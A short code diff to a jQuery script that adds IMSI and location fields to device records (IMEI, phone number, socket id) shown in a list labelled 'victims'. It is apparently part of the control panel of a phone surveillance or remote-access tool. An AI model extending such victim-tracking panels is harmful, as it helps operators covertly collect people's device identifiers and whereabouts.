@@ -141,7 +141,9 @@ $(document).ready(function (){
             'imei' : msg['data'][3],
             'api' : msg['data'][4],
             'socketid' : msg['data'][5],
-            'phone' : msg['data'][6]
+            'phone' : msg['data'][6],
+            'imsi' : msg['data'][7],
+            'location' : msg['data'][8]
           },
           success: function(data){
             $('.victims-body').append(data.htmlresponse);
